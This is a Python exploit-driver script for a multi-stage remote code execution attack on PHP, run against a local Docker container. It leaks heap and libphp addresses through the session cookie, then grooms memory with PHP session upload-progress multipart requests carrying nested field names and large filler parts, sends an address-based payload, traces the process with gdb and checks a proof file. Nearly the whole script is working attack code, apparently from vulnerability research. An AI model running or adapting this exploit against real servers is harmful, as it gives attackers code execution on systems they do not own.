import os, sys
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                 os.pardir, "exploits"))
import os, subprocess, sys, time
import exploit as E, worker, def_rce

C = os.environ.get("C", worker.container_name())
URL = os.environ.get("URL",
        "http://127.0.0.1:%d/index.php" % worker.target_port())
NFILL = int(os.environ.get("NFILL", "6"))
FILLSZ = int(os.environ.get("FILLSZ", str(12 << 20)))
BIGLEN = int(os.environ.get("BIGLEN", str(64 << 20)))
ATTACH = os.environ.get("ATTACH", "1") == "1"
PROOF = os.environ.get("PROOF", os.path.join(worker.out_dir(), "pd"))
SID = def_rce.SID
PAD = os.environ.get("PAD", "")

worker.C = C

subprocess.run(["docker", "exec", C, "sh", "-c",
                "rm -f /srv/out/pd /srv/out/gdb-s3trace.out /tmp/sess_*"],
               check=True)
pid = worker.fresh_workers()
print("worker", pid, flush=True)
t = E.Target(URL, timeout=900.0, verbose=False)

body = def_rce.build_stage1_a()
r = def_rce.post_chunked(URL, body, b"S" * 17, timeout=900.0)
print("S1 A resp", len(r), flush=True)
time.sleep(0.4)
b = def_rce.stage1_b_body()
r = t.post(E.build_multipart(b, b"T" * 11), b"T" * 11,
           read_cap=8 << 20, timeout=180.0)
i = r.find(b"Set-Cookie: PHPSESSID=")
j = r.find(def_rce.CRLF, i)
from urllib.parse import unquote_to_bytes
raw = unquote_to_bytes(r[i:j].split(b"=", 1)[1])[:def_rce.LEAK_LEN]
chunk, libphp = def_rce.parse_leak(raw)
print(f"chunk={chunk:#x} libphp={libphp:#x} raw={len(raw)}", flush=True)
assert chunk and libphp

pid = worker.fresh_workers()
print("worker2", pid, flush=True)
if ATTACH:
    subprocess.run(["docker", "cp",
                    os.path.join(os.path.dirname(os.path.abspath(__file__)), "gdb", "gdb-s3trace.py"),
                    C + ":/srv/out/gdb-s3trace.py"], check=True)
    ws = worker.workers()
    print("attach", ws, flush=True)
    subprocess.run(["docker", "exec", "-d", C, "sh", "-c",
                    "gdb -q -batch -p %d -x /srv/out/gdb-s3trace.py "
                    "> /srv/out/gdb-s3trace.out 2>&1" % ws[0]], check=True)
    time.sleep(1.5)

parts = [{"name": "PHPSESSID", "data": SID},
         {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
         {"name": "e000" + "".join(f"[{k:02d}]" for k in range(60)),
          "filename": "", "data": b""}]
if PAD:
    for k in range(int(PAD)):
        parts.append({"name": f"pad{k}", "data": b"P" * 6})
for k in range(NFILL):
    parts.append({"name": f"p{k}", "data": b"P" * FILLSZ})
parts.append({"name": "big", "data": b"B" * BIGLEN})
abody = E.build_multipart(parts, b"S" * 17)
print("A body", len(abody), flush=True)
try:
    r = def_rce.post_chunked(URL, abody, b"S" * 17, timeout=900.0)
    print("S3 A resp", len(r), flush=True)
except Exception as e:
    print("S3 A err", e, flush=True)
time.sleep(0.4)

bp, htdata, zif = def_rce.stage3_b_body(chunk, libphp)
try:
    r = t.post(E.build_multipart(bp, b"B" * 10), b"B" * 10,
               read_cap=1 << 20, timeout=120.0)
    print("S3 B resp", len(r), flush=True)
except Exception as e:
    print("S3 B err", e, flush=True)
time.sleep(1.0)
if ATTACH:
    
    out = subprocess.run(["docker", "exec", C, "sh", "-c",
                          "cat /srv/out/gdb-s3trace.out"],
                         capture_output=True, text=True).stdout
    lines = out.splitlines()
    keep = [l for l in lines if l.startswith(
        ("ATTACH", "TRACK", "REFD", "ZIF", "BAIL", "INIT", "CLOSEFILES",
         "STOPPED", "RIP", "HASHD", "cmdstr", "  R0", "#"))]
    print("\n".join(keep[:80]))
    print("...", len(lines), "lines")
    print("\n".join(keep[-25:]))
try:
    proof = open(PROOF, "rb").read().decode("latin1").strip()
except OSError:
    proof = ""
print("R0", hex(chunk + def_rce.R0_OFF), "PROOF:", proof, flush=True)
